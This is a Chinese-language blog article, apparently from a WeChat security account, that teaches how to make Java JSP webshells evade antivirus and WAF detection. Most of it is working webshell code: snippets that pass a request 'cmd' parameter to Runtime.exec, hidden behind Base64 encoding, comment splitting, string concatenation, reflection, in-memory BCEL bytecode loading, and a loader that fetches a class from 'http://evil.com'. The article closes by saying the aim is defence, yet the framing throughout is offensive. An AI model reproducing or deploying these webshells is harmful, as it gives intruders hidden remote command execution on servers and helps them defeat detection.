---
title: 第115天-Java Webshell 免杀终极指南：从入门到进阶的攻防艺术
url: https://mp.weixin.qq.com/s/6h9A4VABmGgUEVCxzNC8fA
source: Doonsec's feed
date: 2026-03-29
fetch_date: 2026-03-30T04:43:14.004838
---

# 第115天-Java Webshell 免杀终极指南：从入门到进阶的攻防艺术

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Byhdgj3e9qv5ib9OtaIMYz0u37AEqKRDdeM4EEowyRSA1KNLorPjZXwLZX1Zia96Y1uVazkQka1G4gj2vYxcicPcU6saiallDEiaVibcwaOvUynVs/0?wx_fmt=jpeg)

# 第115天-Java Webshell 免杀终极指南：从入门到进阶的攻防艺术

原创

Сяо Яо
Сяо Яо

AlphaNet

![]()

在小说阅读器中沉浸阅读

> 大家好，我是 Сяо Яо！在网络安全的攻防世界里，Webshell 如同黑夜中的幽灵，是攻击者们梦寐以求的据点。然而，随着各类安全设备（WAF）、入侵检测系统（IDS）和杀毒软件的“围追堵截”，传统的 Webshell 早已无处遁形。如何让我们的“小马”巧妙地绕过重重防线，实现“免杀”，成为了每一位安全研究员的必修课。今天，就让我们一起深入探索 Java Webshell 的免杀艺术，揭开混淆、反射、字节码加载等高级技巧的神秘面纱！

### 🤔 **一、Webshell 与免杀：是什么？**

首先，我们得搞清楚两个基本概念：

* **Webshell 是什么？**
  简单来说，Webshell 就是一个基于 Web 的后门程序。攻击者在成功入侵一个网站后，会上传一个脚本文件（比如 Java 的 `.jsp` 文件），通过这个文件，他们可以在浏览器端执行服务器上的系统命令、管理文件、操作数据库，从而完全控制服务器。

* **免杀是什么？**
  “免杀”就是“反病毒（Anti-Virus）”或“反检测（Anti-Detection）”的通俗叫法。它的核心目标是通过各种技术手段，对 Webshell 代码进行伪装和变形，使其能够绕过安全软件的静态和动态检测，从而在目标服务器上“隐形”存活。

### ❓ **二、为什么要免杀：知己知彼，百战不殆**

在真实的攻防场景中，我们上传的 Webshell 将面临来自四面八方的“火力侦察”：

* **静态检测**：安全软件会扫描文件的源代码，匹配已知的恶意代码特征（比如 `Runtime.getRuntime().exec()` 这样的“敏感词”）。一旦匹配成功，Webshell 就会被立即隔离或删除。

* **动态检测**：当 Webshell 运行时，它的行为（如网络连接、命令执行）会被监控。如果流量或行为模式触发了预设的恶意规则，同样会被拦截。

因此，不经过处理的“裸奔”Webshell 几乎是“秒杀”的命运。学习免杀技术，不仅是为了“攻击”，更是为了深入理解检测机制，从而构建更坚固的“防御”体系。

### 🛠️ **三、如何实现免杀：六大核心技术详解**

掌握了理论，接下来就是激动人心的实战环节！下面，我们将逐一解析六种主流的 Java Webshell 静态免杀技术。

#### 1. **加密混淆：给代码穿上“隐身衣”** 🎭

这是最基础也是最直接的方法。通过对敏感的命令字符串或整个代码块进行加密或编码，可以有效规避基于字符串特征的扫描。

* **核心思想**：将 `cmd`、`Runtime` 等敏感字符用其他形式表示，在执行时再解码还原。

* **常用方法**：XOR（异或）、AES、Base64、字符反转等。

**示例：Base64 编码**

原始的执行命令代码：

```
Runtime.getRuntime().exec("whoami");
```

经过 Base64 编码后，`"whoami"` 变成了 `"d2hvYW1p"`。代码也随之变形：

```
<%@page import="java.util.Base64"%>
<%
    String cmd = new String(Base64.getDecoder().decode("d2hvYW1p"));
    Runtime.getRuntime().exec(cmd);
%>
```

> 💡 **提示**：单一的 Base64 编码很容易被检测，实战中通常会结合多种加密方式或自定义加解密算法。

---

#### 2. **利用注释：障眼法大师** 🙈

Java 编译器会忽略注释，但某些安全检测引擎可能不会。我们可以利用这一点，将关键词分割开，干扰检测规则。

* **核心思想**：在关键词的中间插入空的注释 `/**/`。

**示例：**

```
// 原始代码
Runtime.getRuntime().exec(request.getParameter("cmd"));

// 混淆后
Runtime//.getRuntime()//.exec(request.getParameter("cmd"));
```

> 这种看似简单的技巧，有时却能出奇制胜，绕过一些简单的正则匹配规则。

---

#### 3. **改变特征：偷天换日** 🔄

修改或重组代码中的常见变量名和字符串，让它看起来不再像一个典型的 Webshell。

* **核心思想**：避免使用 `cmd`, `shell`, `exec` 等高危变量名；将字符串拼接、拆分或使用 `new String()` 等方式创建。

**示例：**

```
// 原始特征
String cmd = request.getParameter("cmd");
Runtime.getRuntime().exec(cmd);

// 改变特征后
String myParam = request.getParameter("p");
String rt = "Run";
String time = "time";
String command = rt + time; // "Runtime"
// 利用反射调用，隐藏 exec 关键字
java.lang.reflect.Method method = Class.forName("java.lang." + command).getMethod("exec", String.class);
method.invoke(Class.forName("java.lang." + command).getMethod("getRuntime").invoke(null), myParam);
```

---

#### 4. **反射机制：绕过静态引用的“阳关道”** ✨

反射是 Java 的一大神器，也是 Webshell 免杀的“王牌”技术。它允许程序在运行时动态地加载类、获取方法并执行，从而避免在代码中直接出现敏感的类名和方法名。

* **核心思想**：通过 `Class.forName()` 和 `method.invoke()` 动态调用，而不是静态的 `Runtime.exec()`。

**示例：**

```
<%@page import="java.lang.reflect.Method"%>
<%
    // 1. 获取 Class 对象
    Class<?> runtimeClass = Class.forName("java.lang.Runtime");

```
// 2. 获取 getRuntime 方法并调用，得到 Runtime 实例
Method getRuntimeMethod = runtimeClass.getMethod("getRuntime");
Object runtimeInstance = getRuntimeMethod.invoke(null);

// 3. 获取 exec 方法
Method execMethod = runtimeClass.getMethod("exec", String.class);

// 4. 调用 exec 方法执行命令
String cmd = request.getParameter("cmd");
execMethod.invoke(runtimeInstance, cmd);
```

%>
```

> 🚀 **进阶**：可以将类名、方法名等字符串再次进行加密混淆，进一步提升免杀效果。

---

#### 5. **字节码加载：从源头“隐身”** 👻

既然源代码容易被检测，那我们干脆不写恶意源代码，直接加载恶意的字节码（`.class` 文件内容）！

* **核心思想**：将包含恶意逻辑的 Java 代码编译成字节码，然后通过 `ClassLoader` 或 `BCEL` 等库在内存中动态定义并加载这个类。

**示例：使用 BCEL 加载字节码**

```
<%@page import="com.sun.org.apache.bcel.internal.classfile.Utility"%>
<%@page import="com.sun.org.apache.bcel.internal.util.ClassLoader"%>
<%
    String evilCode = "yv66vgAAADQAIgoABA...（此处省略巨长的一段字节码）";

```
byte[] bytes = Utility.decode(evilCode, true);

new ClassLoader().loadClass(bytes).newInstance();
```

%>
```

---

#### 6. **远程分离加载：终极“谍战”模式** 🛰️

这是目前最流行也最隐蔽的方式之一，将 Webshell 的“大脑”和“身体”彻底分离。

* **核心思想**：JSP 文件本身只是一个加载器，从远程获取恶意代码再执行。

**示例：**

```
<%@page import="java.net.URL"%>
<%@page import="java.net.URLClassLoader"%>
<%
    URL url = new URL("http://evil.com/Evil.class");

```
URLClassLoader ucl = new URLClassLoader(new URL[]{url});

Class.forName("com.example.EvilClass", true, ucl);
```

%>
```

---

### 📊 **核心要点总结**

| 技术类型 | 核心思想 | 优点 | 缺点 |
| --- | --- | --- | --- |
| **加密混淆** | 对敏感字符串进行编码，运行时解码 | 实现简单，能过基础检测 | 容易被针对性解密和检测 |
| **利用注释** | 在关键词中插入`/**/` | 极其简单，有时有奇效 | 容易被成熟的检测引擎忽略 |
| **改变特征** | 修改变量名、拆分字符串 | 增加代码阅读和分析难度 | 效果有限，治标不治本 |
| **反射机制** | 动态加载类和方法 | 规避静态特征码扫描 | 可能成为新特征 |
| **字节码加载** | 内存加载恶意类 | 文件干净 | 可能被内存检测 |
| **远程分离加载** | Loader + 远程 Payload | 隐蔽性极高 | 依赖网络 |

---

### 🧐 **最后的思考**

我们今天探讨的所有技术，都属于**静态免杀**的范畴。而真正的对抗，还在于**动态层面**。

**学习免杀，是为了更好地理解威胁，从而构筑更强大的防御。**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Byhdgj3e9quk3H3M941l5byeiaCLHfZUhoIib5xPSPc8ddSdEOynSxIhaaiaIxwJImQia7wqHZPUerghtNSnbEj87A80CvEm0bGia8Is4qGerIvc/0?wx_fmt=png)

AlphaNet

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Byhdgj3e9quk3H3M941l5byeiaCLHfZUhoIib5xPSPc8ddSdEOynSxIhaaiaIxwJImQia7wqHZPUerghtNSnbEj87A80CvEm0bGia8Is4qGerIvc/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过